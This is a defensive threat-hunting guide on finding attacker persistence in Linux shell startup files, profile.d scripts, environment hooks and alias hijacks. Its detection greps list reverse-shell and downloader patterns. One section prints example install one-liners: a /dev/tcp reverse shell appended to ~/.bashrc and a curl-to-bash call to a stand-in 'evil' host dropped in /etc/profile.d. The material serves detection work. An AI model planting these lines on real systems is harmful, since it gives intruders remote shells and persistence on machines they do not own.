# Shell Startup and Profile Scripts

Every time a shell starts, it sources a chain of startup files — and any command in those files runs automatically. That makes them a simple, reliable persistence vector: append one line and it executes on the next login or interactive shell, as that user. The system-wide files (`/etc/profile`, `/etc/profile.d/*`, `/etc/bash.bashrc`) are the higher-impact targets because a single dropped file there fires for *every* user. Detection is reading these files for injected payloads — but you have to read them, not just grep one pattern, because they legitimately contain shell code.

> 🔴 `/etc/profile.d/*.sh` is the system-wide sweet spot — a dropped `.sh` there runs for every login shell on the box, and it blends in with the legitimate scripts already there. Per-user, `~/.bashrc` (interactive) and `~/.bash_profile`/`~/.profile` (login) are the targets; which one fires depends on how the shell was invoked, so check them all.

## Contents

- [Quick Triage](#quick-triage)
- [What to Check for What](#what-to-check-for-what)
- [How the Persistence Works](#how-the-persistence-works)
- [The Startup File Chain](#the-startup-file-chain)
- [Non-rc Execution Hooks](#non-rc-execution-hooks)
- [Alias and Function Hijacks](#alias-and-function-hijacks)
- [Hunting Injected Payloads](#hunting-injected-payloads)
- [Timestamps](#timestamps)
- [Deep Threat Hunts](#deep-threat-hunts)
- [Getting Max Value](#getting-max-value)
- [Correlate With](#correlate-with)
- [Scenarios](#scenarios)
- [Red Flags](#red-flags)

## Quick Triage

```bash
# Payload-shaped lines in per-user + system rc/profile files
grep -rIE "curl|wget|base64|nc |bash -i|/dev/tcp|LD_PRELOAD|python -c" \
  /home/*/.bashrc /home/*/.profile /home/*/.bash_profile /home/*/.zshrc /root/.bashrc \
  /etc/profile /etc/profile.d/* /etc/bash.bashrc 2>/dev/null

# System-wide injection dir
ls -la /etc/profile.d/

# Recently modified startup files
find /home /root -maxdepth 2 \( -name ".bashrc" -o -name ".profile" -o -name ".bash_profile" -o -name ".zshrc" \) -newermt "3 hours ago" -ls 2>/dev/null
```

## What to Check for What

| Investigative question | Command / source |
|------------------------|------------------|
| Payload in a user/system rc file? | `grep -rIE 'curl\|/dev/tcp\|base64\|LD_PRELOAD' <rc files>` |
| System-wide (all users) persistence? | unowned `.sh` in `/etc/profile.d/` |
| Fires without an obvious rc edit? | `BASH_ENV`/`PROMPT_COMMAND`/`~/.ssh/rc`/`/etc/environment` |
| Command/credential hijack? | `alias`/function overrides of `sudo`/`ssh`/`ls` |
| Logout-triggered (rarely checked)? | `~/.bash_logout`, `~/.zlogout` |
| System-wide LD_PRELOAD without ld.so.preload? | `/etc/environment` (pam_env) |
| When was the rc file edited? | `stat` mtime/ctime vs sibling dotfiles |

## How the Persistence Works

The attacker appends a command to a startup file; it runs on the next shell/login. The install is a one-liner:

```bash
# Per-user: runs on every interactive bash shell for this user
echo 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1 &' >> ~/.bashrc

# System-wide: runs for EVERY user's login shell
echo 'curl -s http://evil/c | bash &' > /etc/profile.d/00-update.sh
```

🔴 The payload is usually backgrounded (`&`) so it doesn't hang the shell, and often a reverse shell or a downloader. Because it lives in a file the user's shell sources anyway, it re-launches on every new session with no separate scheduler.

## The Startup File Chain

Which files run depends on login-vs-non-login and interactive-vs-non-interactive — attackers pick whichever reliably fires for their access method (an SSH login sources the login chain; a new terminal sources `~/.bashrc`).

| Shell / invocation | System-wide | Per-user (in order) |
|--------------------|-------------|---------------------|
| bash **login** (SSH, console) | `/etc/profile` → `/etc/profile.d/*` | `~/.bash_profile` → `~/.bash_login` → `~/.profile` |
| bash **interactive** (new terminal) | `/etc/bash.bashrc` | `~/.bashrc` |
| bash **logout** | — | `~/.bash_logout` |
| zsh | `/etc/zsh/zshrc`, `/etc/zsh/zprofile` | `~/.zshenv` → `~/.zprofile` → `~/.zshrc` → `~/.zlogin` |
| sh / dash | `/etc/profile` | `~/.profile` |

> `~/.bash_logout` and `~/.zlogout` are the sneaky ones — a payload there runs when the user *logs out*, which analysts rarely check.

## Non-rc Execution Hooks

🔴 Persistence that fires *without* editing the visible top of `.bashrc` — these are the ones an rc-file-only sweep misses:

| Hook | Fires when |
|------|-----------|
| `BASH_ENV` / `ENV` env var | 🔴 A **non-interactive** bash/sh runs (cron scripts, subshells) |
| `PROMPT_COMMAND` | 🔴 Before **every** interactive prompt (runs repeatedly) |
| `~/.ssh/rc`, `/etc/ssh/sshrc` | 🔴 On **every SSH login** (before the shell) |
| `/etc/environment` | Login env via **pam_env** — a planted `LD_PRELOAD` hits every login |
| `~/.ssh/environment` | If `PermitUserEnvironment yes` — per-key env injection |

```bash
# Env-based execution hooks anywhere
grep -rEn 'BASH_ENV|^ENV=|PROMPT_COMMAND' /etc /home /root 2>/dev/null

# SSH-login hooks + system LD_PRELOAD via pam_env
ls -l /home/*/.ssh/rc /etc/ssh/sshrc /home/*/.ssh/environment 2>/dev/null

grep -i preload /etc/environment /etc/security/pam_env.conf 2>/dev/null
```

## Alias and Function Hijacks

🔴 A subtler rc trick: redefine a **command** rather than append a payload line. An `alias sudo='…'` can capture the sudo password; a shell **function** named after a real command runs the attacker's code every time it's invoked.

```bash
# Suspicious aliases / functions overriding real commands
grep -rEn '^\s*alias\s+(sudo|ssh|ls|cat|passwd|su)=|^\s*(sudo|ssh|ls|cat)\s*\(\)\s*\{' \
  /home/*/.bashrc /home/*/.bash_profile /home/*/.zshrc /etc/profile.d/* /etc/bash.bashrc 2>/dev/null
```

An `alias sudo='mysudo'` or a `sudo() { … }` function is a credential-capture trap; a redefined `ls`/`cat` can hide files or trigger a payload on routine use.

## Hunting Injected Payloads

```bash
# Read the per-user files fully (they legitimately contain code - don't just grep)
cat /home/*/.bashrc /home/*/.bash_profile /home/*/.profile /root/.bashrc 2>/dev/null

# System-wide files + the profile.d drop-in dir
cat /etc/profile /etc/bash.bashrc 2>/dev/null; ls -la /etc/profile.d/; cat /etc/profile.d/* 2>/dev/null

# High-signal payload patterns
grep -rIE "curl|wget|base64 -d|/dev/tcp|/dev/shm|nc |ncat|socat|bash -i|python -c|perl -e|LD_PRELOAD|eval " \
  /home/*/.* /root/.* /etc/profile /etc/profile.d/* /etc/bash.bashrc 2>/dev/null

# Files not owned by any package in profile.d (hand-dropped)
for f in /etc/profile.d/*; do dpkg -S "$f" >/dev/null 2>&1 || rpm -qf "$f" >/dev/null 2>&1 || echo "UNOWNED: $f"; done
```

🔴 An unowned `.sh` in `/etc/profile.d/`, or any of the reverse-shell/downloader/`LD_PRELOAD` patterns in a startup file, is persistence. Legitimate rc files set `PATH`, aliases, prompt, and `eval "$(tool init)"` lines — a `curl|bash`, a `/dev/tcp` redirect, or a base64 blob is not legitimate.

## Timestamps

```bash
# When was the startup file last changed?
stat /home/*/.bashrc /etc/profile.d/* 2>/dev/null

# Startup files modified in the incident window
find /home /root /etc \( -name ".bashrc" -o -name ".profile" -o -name ".bash_profile" -o -path "/etc/profile.d/*" \) -newermt "<start>" ! -newermt "<end>" -ls 2>/dev/null
```

🔴 A startup file whose mtime lands in the incident window — especially one much newer than the account's other dotfiles — was likely edited to plant the payload. `ctime` newer than `mtime` on such a file suggests timestomping (see the Anti-Forensics note).

## Deep Threat Hunts

Full shell-init + hook + hijack sweep. *(seasoned-DFIR; read files fully, grep is triage only)*

```bash
# 1. Payload-shaped lines across ALL shell init + env-hook files
grep -rIEn 'curl|wget|base64 -d|/dev/tcp|/dev/shm|nc |bash -i|python -c|LD_PRELOAD|eval ' \
  /etc/profile /etc/profile.d/ /etc/bash.bashrc /etc/bashrc /etc/zsh/ /etc/environment \
  /home/*/.bashrc /home/*/.bash_profile /home/*/.profile /home/*/.zshrc /home/*/.zshenv \
  /home/*/.bash_logout /root/.bashrc /root/.profile 2>/dev/null

# 2. Non-rc execution hooks (fire without editing .bashrc's top)
grep -rEn 'BASH_ENV|^ENV=|PROMPT_COMMAND' /etc /home /root 2>/dev/null

ls -l /home/*/.ssh/rc /etc/ssh/sshrc /home/*/.ssh/environment 2>/dev/null

# 3. Unowned scripts in /etc/profile.d (hand-dropped, all-user)
for f in /etc/profile.d/*; do dpkg -S "$f" >/dev/null 2>&1 || rpm -qf "$f" >/dev/null 2>&1 || echo "UNOWNED: $f"; done

# 4. alias / function hijacks of sensitive commands
grep -rEn '^\s*alias\s+(sudo|ssh|ls|cat|passwd)=|^\s*(sudo|ssh|ls)\s*\(\)\s*\{' \
  /home/*/.bashrc /home/*/.zshrc /etc/profile.d/* 2>/dev/null

# 5. System-wide LD_PRELOAD via pam_env
grep -i preload /etc/environment /etc/security/pam_env.conf 2>/dev/null

# 6. Startup files edited in the incident window / newer than siblings
find /home /root /etc \( -name '.bashrc' -o -name '.profile' -o -path '/etc/profile.d/*' \) -newermt '-3 days' -ls 2>/dev/null
```

**Hunt ideas:**

- **Read init files fully AND grep the hooks** — `BASH_ENV`/`PROMPT_COMMAND` and `~/.ssh/rc` fire without an obvious rc edit.
- **alias/function hijacks are stealthy** — `alias sudo='mysudo'` captures the password; `ls() { real-ls; payload; }` runs on every `ls`.
- **`/etc/environment` `LD_PRELOAD` hits *every* login** via pam_env — a system-wide preload that never touches `ld.so.preload`.
- **Compare an rc file's mtime to the account's other dotfiles** — the outlier was likely edited to plant the payload.
- **An unowned `.sh` in `/etc/profile.d/`** is all-user persistence — package-map every file there.

## Getting Max Value

- **Read every init file fully** — they legitimately hold code; grep is a triage aid, not the verdict.
- **Cover the whole surface** — the login/interactive/logout chain, env hooks, `~/.ssh/rc`, `/etc/environment`, and alias/function overrides.
- **mtime/ctime dates the plant** — `ctime > mtime` on an rc file suggests timestomping.
- **Cross-ref note 04 (Shells)** for the history/artifact side, and **Preload** for `LD_PRELOAD` depth.
- **Package-map `/etc/profile.d`** — unowned scripts are hand-dropped.

## Correlate With

| To answer… | Pivot to |
|------------|----------|
| The history/artifact side of shells | **Shells and Command History** (04) |
| `LD_PRELOAD` injection in depth | **Preload Hijacking** |
| The `~/.ssh/rc` / SSH-login hook side | **SSH Keys**, **SSH Artifacts** (08) |
| When it was planted / timestomp | **File and Directory Permissions** (02), **Timelining** (13) |
| What the payload actually did | **Auditd**, **Systemd Journal**, **Process Trees** (10b) |
| Remove it safely | **Remediation and Containment** (14) |

## Scenarios

- **System-wide:** an unowned `.sh` in `/etc/profile.d/` runs for every user's login shell.
- **Per-user reverse shell:** a `bash -i >& /dev/tcp/…` line in `~/.bashrc`.
- **Env hook:** `BASH_ENV`/`PROMPT_COMMAND` set to a payload path — fires with no visible rc edit.
- **Logout trigger:** a payload in `~/.bash_logout` that analysts rarely check.
- **Credential trap:** an `alias sudo='…'` or `sudo() {…}` function captures the password.
- **pam_env preload:** an `LD_PRELOAD` in `/etc/environment` injects into every login system-wide.

## Red Flags

| 🔴 Finding | Likely meaning |
|-----------|----------------|
| `curl\|bash` / reverse shell / base64 in an rc or profile file | Login-triggered payload |
| Unowned `.sh` in `/etc/profile.d/` | System-wide persistence for all users |
| `LD_PRELOAD=` export in a startup file | Library injection persistence |
| Payload in `~/.bash_logout` / `~/.zlogout` | Logout-triggered (rarely checked) |
| Startup file mtime in incident window / newer than sibling dotfiles | Recently modified to plant persistence |
| Payload path in `/tmp`/`/dev/shm` | Staged malware |
| `BASH_ENV`/`PROMPT_COMMAND` set to a script | Hook-based persistence (no obvious rc edit) |
| `~/.ssh/rc` / `/etc/ssh/sshrc` present | Runs on every SSH login |
| `alias sudo=` / `sudo() {…}` function | Credential-capture hijack |
| `LD_PRELOAD` in `/etc/environment` | System-wide library injection via pam_env |

## Resources

- `bash(1)` (INVOCATION / STARTUP FILES), `zsh(1)`, `ssh(1)` (`~/.ssh/rc`), `pam_env(8)` man pages
- MITRE ATT&CK: T1546.004 (Unix Shell Configuration Modification), T1574.006 (LD_PRELOAD), T1546.005 (Trap)
